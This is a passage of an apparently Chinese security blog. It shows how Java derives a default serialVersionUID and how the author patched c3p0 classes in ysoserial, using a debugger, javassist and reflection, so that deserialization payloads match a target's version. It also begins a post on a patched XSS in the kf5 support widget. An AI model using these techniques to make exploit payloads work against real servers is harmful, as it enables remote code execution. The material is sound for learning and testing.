<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getSerialVersionUID</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// REMIND: synchronize instead of relying on volatile?</span></span><br><span class="line">    <span class="keyword">if</span> (suid == <span class="keyword">null</span>) &#123;</span><br><span class="line">        suid = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> PrivilegedAction&lt;Long&gt;() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Long <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> computeDefaultSUID(cl);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> suid.longValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>computeDefaultSUID的大概实现就是通过反射获取到反序列类的成员属性,方法,实现接口等以及它们的修饰符输出到流中, 最后SHA HASH生成SUID。<br>在这里计算SUID的时候 没有用到成员属性的值以及方法的具体实现, 所以如果修改了成员属性的值和方法的实现是不存在影响的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">computeDefaultSUID</span><span class="params">(Class&lt;?&gt; cl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!Serializable.class.isAssignableFrom(cl) || Proxy.isProxyClass(cl))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ByteArrayOutputStream bout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        DataOutputStream dout = <span class="keyword">new</span> DataOutputStream(bout);</span><br><span class="line"></span><br><span class="line">        dout.writeUTF(cl.getName());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> classMods = cl.getModifiers() &amp;</span><br><span class="line">            (Modifier.PUBLIC | Modifier.FINAL |</span><br><span class="line">             Modifier.INTERFACE | Modifier.ABSTRACT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * compensate for javac bug in which ABSTRACT bit was set for an</span></span><br><span class="line"><span class="comment">         * interface only if the interface declared methods</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Method[] methods = cl.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">if</span> ((classMods &amp; Modifier.INTERFACE) != <span class="number">0</span>) &#123;</span><br><span class="line">            classMods = (methods.length &gt; <span class="number">0</span>) ?</span><br><span class="line">                (classMods | Modifier.ABSTRACT) :</span><br><span class="line">                (classMods &amp; ~Modifier.ABSTRACT);</span><br><span class="line">        &#125;</span><br><span class="line">        dout.writeInt(classMods);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!cl.isArray()) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * compensate for change in 1.2FCS in which</span></span><br><span class="line"><span class="comment">             * Class.getInterfaces() was modified to return Cloneable and</span></span><br><span class="line"><span class="comment">             * Serializable for array classes.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            Class&lt;?&gt;[] interfaces = cl.getInterfaces();</span><br><span class="line">            String[] ifaceNames = <span class="keyword">new</span> String[interfaces.length];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; interfaces.length; i++) &#123;</span><br><span class="line">                ifaceNames[i] = interfaces[i].getName();</span><br><span class="line">            &#125;</span><br><span class="line">            Arrays.sort(ifaceNames);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ifaceNames.length; i++) &#123;</span><br><span class="line">                dout.writeUTF(ifaceNames[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field[] fields = cl.getDeclaredFields();</span><br><span class="line">        MemberSignature[] fieldSigs = <span class="keyword">new</span> MemberSignature[fields.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">            fieldSigs[i] = <span class="keyword">new</span> MemberSignature(fields[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(fieldSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> ms1.name.compareTo(ms2.name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fieldSigs.length; i++) &#123;</span><br><span class="line">            MemberSignature sig = fieldSigs[i];</span><br><span class="line">            <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">                (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">                 Modifier.STATIC | Modifier.FINAL | Modifier.VOLATILE |</span><br><span class="line">                 Modifier.TRANSIENT);</span><br><span class="line">            <span class="keyword">if</span> (((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) ||</span><br><span class="line">                ((mods &amp; (Modifier.STATIC | Modifier.TRANSIENT)) == <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                dout.writeUTF(sig.name);</span><br><span class="line">                dout.writeInt(mods);</span><br><span class="line">                dout.writeUTF(sig.signature);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (hasStaticInitializer(cl)) &#123;</span><br><span class="line">            dout.writeUTF(<span class="string">&quot;&lt;clinit&gt;&quot;</span>);</span><br><span class="line">            dout.writeInt(Modifier.STATIC);</span><br><span class="line">            dout.writeUTF(<span class="string">&quot;()V&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Constructor&lt;?&gt;[] cons = cl.getDeclaredConstructors();</span><br><span class="line">        MemberSignature[] consSigs = <span class="keyword">new</span> MemberSignature[cons.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cons.length; i++) &#123;</span><br><span class="line">            consSigs[i] = <span class="keyword">new</span> MemberSignature(cons[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(consSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> ms1.signature.compareTo(ms2.signature);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; consSigs.length; i++) &#123;</span><br><span class="line">            MemberSignature sig = consSigs[i];</span><br><span class="line">            <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">                (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">                 Modifier.STATIC | Modifier.FINAL |</span><br><span class="line">                 Modifier.SYNCHRONIZED | Modifier.NATIVE |</span><br><span class="line">                 Modifier.ABSTRACT | Modifier.STRICT);</span><br><span class="line">            <span class="keyword">if</span> ((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) &#123;</span><br><span class="line">                dout.writeUTF(<span class="string">&quot;&lt;init&gt;&quot;</span>);</span><br><span class="line">                dout.writeInt(mods);</span><br><span class="line">                dout.writeUTF(sig.signature.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        MemberSignature[] methSigs = <span class="keyword">new</span> MemberSignature[methods.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methods.length; i++) &#123;</span><br><span class="line">            methSigs[i] = <span class="keyword">new</span> MemberSignature(methods[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(methSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">int</span> comp = ms1.name.compareTo(ms2.name);</span><br><span class="line">                <span class="keyword">if</span> (comp == <span class="number">0</span>) &#123;</span><br><span class="line">                    comp = ms1.signature.compareTo(ms2.signature);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> comp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methSigs.length; i++) &#123;</span><br><span class="line">            MemberSignature sig = methSigs[i];</span><br><span class="line">            <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">                (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">                 Modifier.STATIC | Modifier.FINAL |</span><br><span class="line">                 Modifier.SYNCHRONIZED | Modifier.NATIVE |</span><br><span class="line">                 Modifier.ABSTRACT | Modifier.STRICT);</span><br><span class="line">            <span class="keyword">if</span> ((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) &#123;</span><br><span class="line">                dout.writeUTF(sig.name);</span><br><span class="line">                dout.writeInt(mods);</span><br><span class="line">                dout.writeUTF(sig.signature.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        dout.flush();</span><br><span class="line"></span><br><span class="line">        MessageDigest md = MessageDigest.getInstance(<span class="string">&quot;SHA&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] hashBytes = md.digest(bout.toByteArray());</span><br><span class="line">        <span class="keyword">long</span> hash = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = Math.min(hashBytes.length, <span class="number">8</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            hash = (hash &lt;&lt; <span class="number">8</span>) | (hashBytes[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hash;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InternalError(ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> SecurityException(ex.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里来对比一下两个版本C3P0的com.mchange.v2.c3p0.PoolBackedDataSource</p>
<p>0.9.5.2版本,</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mchange.v2.c3p0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.AbstractPoolBackedDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PoolBackedDataSource</span> <span class="keyword">extends</span> <span class="title">AbstractPoolBackedDataSource</span> <span class="keyword">implements</span> <span class="title">PooledDataSource</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PoolBackedDataSource</span><span class="params">(<span class="keyword">boolean</span> autoregister)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(autoregister);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PoolBackedDataSource</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PoolBackedDataSource</span><span class="params">(String configName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>();</span><br><span class="line">        <span class="keyword">this</span>.initializeNamedConfig(configName, <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">(<span class="keyword">boolean</span> show_config)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>0.9.1.1版本,</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mchange.v2.c3p0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.AbstractPoolBackedDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PoolBackedDataSource</span> <span class="keyword">extends</span> <span class="title">AbstractPoolBackedDataSource</span> <span class="keyword">implements</span> <span class="title">PooledDataSource</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PoolBackedDataSource</span><span class="params">(<span class="keyword">boolean</span> autoregister)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(autoregister);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PoolBackedDataSource</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PoolBackedDataSource</span><span class="params">(String configName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(configName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>两个版本的com.mchange.v2.c3p0.PoolBackedDataSource类中都没有定义SUID, 所以通过computeDefaultSUID来得出SUID, 而且可以明显的看出 在高版本的C3P0当中多了一个toString方法, 必然两个版本经过computeDefaultSUID得到的SUID不同。</p>
<p>对于这种没有显示定义SUID的场景, 大概想了几种方法。</p>
<h3 id="1-反射"><a href="#1-反射" class="headerlink" title="1 反射"></a>1 反射</h3><p>尝试通过反射添加SUID属性, 然后再修改属性值为7387108436934414104。<br>但是翻了下文档, 没看到反射动态添加属性这个操作, 就只有放弃了。</p>
<h3 id="2-Hook"><a href="#2-Hook" class="headerlink" title="2 Hook"></a>2 Hook</h3><p>Hook computeDefaultSUID方法, 如果传入的类是com.mchange.v2.c3p0.PoolBackedDataSource, 直接修改返回值为7387108436934414104。<br>但是找了一下 都没找到个合适的能hook class的框架,<br>就直接用idea来”hook”了。<br>在computeDefaultSUID里下个断点, </p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ys_2.jpg" alt="-w971"><br>把hash修改为7387108436934414104<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ys_3.jpg" alt="-w602"></p>
<p>就不会在出现SUID异常了。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ys_4.jpg" alt="-w1075"></p>
<h3 id="3-修改字节码"><a href="#3-修改字节码" class="headerlink" title="3 修改字节码"></a>3 修改字节码</h3><p>直接使用javassist修改com.mchange.v2.c3p0.PoolBackedDataSource的字节码, 给它添加上一个值为7387108436934414104的SUID属性。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    CtClass cls = pool.get(<span class="string">&quot;com.mchange.v2.c3p0.PoolBackedDataSource&quot;</span>);</span><br><span class="line">    CtField field = CtField.make(<span class="string">&quot;private static final long serialVersionUID = 7387108436934414104;&quot;</span>,cls);</span><br><span class="line">    cls.addField(field);</span><br><span class="line">    cls.writeFile();</span><br><span class="line">&#125; <span class="keyword">catch</span> (NotFoundException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (CannotCompileException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>修改字节码后, 重新打包jar包 加载到ysoserial当中,<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ys_5.jpg" alt="-w849"><br>serialVersionUID已经定义上。<br>再次生成payload,<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ys_6.jpg" alt="-w1251"><br>不再出现SUID异常。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ys_7.jpg" alt="-w1131"></p>
<h2 id="类显式定义serialVersionUID属性"><a href="#类显式定义serialVersionUID属性" class="headerlink" title="类显式定义serialVersionUID属性"></a>类显式定义serialVersionUID属性</h2><p>如果序列化的类显示定义了serialVersionUID, 只是值不同造成的异常解决起来就比较简单了, 直接通过反射修改该属性值即可。<br>由于每一个SUID属性的修饰符都是private static final,数据类型为long。<br>final修饰的属性没法通过反射直接修改属性值, 所以需要先通过反射修改SUID的修饰符 把final修饰符给去掉。<br>去掉final之后, 再修改SUID的属性值, 最后再把final修饰符重新添加回去即可。<br>假设(这是我自己改代码造的场景了)</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ys_8.jpg" alt="-w1109"><br>YSO的C3P0 Jar包 SUID为7387108436934414104, 打反序列时提示<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ys_9.jpg" alt="-w869"><br>所以此时要把yso里的SUID从7387108436934414104修改为-2440162180985815128.<br>因为这时yso C3P0包存在SUID只是值不同而已, 所以直接利用反射来修改。<br>在生成payload之前把suid改掉, </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class clazz = Class.forName(<span class="string">&quot;com.mchange.v2.c3p0.PoolBackedDataSource&quot;</span>);</span><br><span class="line">    Object obj = clazz.newInstance();</span><br><span class="line"></span><br><span class="line">    Field field = clazz.getDeclaredField(<span class="string">&quot;serialVersionUID&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    Field modifersField = Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">    modifersField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    modifersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">    field.setLong(obj,-<span class="number">2440162180985815128L</span>);</span><br><span class="line">    modifersField.setInt(field, field.getModifiers() &amp; Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ys_10.jpg" alt="-w932"></p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ys_11.jpg" alt="-w1064"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我TM真是闲, 还是直接修改版本方便多了。。。</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/03/08/逸创云客服-鸡肋xss分析/"><span>逸创云客服系统 鸡肋xss分析</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/03/08/逸创云客服-鸡肋xss分析/" rel="bookmark">
        <time class="entry-date published" datetime="2019-03-08T11:53:54.000Z">
          2019-03-08
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>一套云客服系统, 以前我salt哥教我挖的xss, 自己以前做测试的时候遇到过几次用这系统的 打poc都能成功, 不过最近又遇到了一个, 尝试用以前的poc打的时候,发现失败了。看了一下最新的代码, 发现已经修复了。<br>修复方法为<br>1: 限制了postmessage的来源必须是support.kf5.com<br>2: showNotice方法当中, 把innerHTML改成了innerText<br>尝试绕过了一下, 算是失败了吧。</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这里首先以官网(<a target="_blank" rel="noopener" href="http://www.kf5.com/">http://www.kf5.com</a>) 为例测试一下, 直接看看修复后的代码<br>每一个要使用这套云客户系统的客户, 都需要引入一个js文件。<br><a target="_blank" rel="noopener" href="http://assets-cdn.kf5.com//supportbox//main.js">http://assets-cdn.kf5.com//supportbox//main.js</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">    document.write(&#x27;<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;\/\/assets-cdn.kf5.com\/supportbox\/main.js?&#x27; + (new Date).getDay() + &#x27;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;kf5-provide-supportBox&quot;</span> <span class="attr">kf5-domain</span>=<span class="string">&quot;support.kf5.com&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span>&#x27;);</span></span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在这个js文件当中,  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> easing = &#123;</span><br><span class="line">    swing: <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">.5</span> - <span class="built_in">Math</span>.cos(t * <span class="built_in">Math</span>.PI) / <span class="number">2</span></span><br><span class="line">    &#125;, <span class="attr">linear</span>: <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> t</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">setup(), autoPopupService()</span><br></pre></td></tr></table></figure>
<p>调用了setup方法, </p>
